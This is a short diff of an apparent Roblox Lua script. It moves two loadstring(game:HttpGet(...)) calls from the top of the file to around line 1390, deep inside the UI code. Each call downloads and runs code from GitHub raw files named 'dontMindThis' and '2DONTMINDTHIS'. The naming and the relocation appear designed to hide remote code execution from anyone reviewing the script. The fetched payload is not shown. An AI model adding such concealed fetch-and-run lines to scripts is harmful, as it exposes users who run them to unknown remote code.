@@ -12,9 +12,6 @@ local LocalPlayer = game.Players.LocalPlayer
          end
        end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/dontMindThis", true))() 
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/2DONTMINDTHIS", true))() 
 
 
 
@@ -1393,7 +1390,10 @@ local Button = Tab:CreateButton({
 
 
 
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/dontMindThis", true))() 
+ 
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/2DONTMINDTHIS", true))() 
+ 
 
 
 
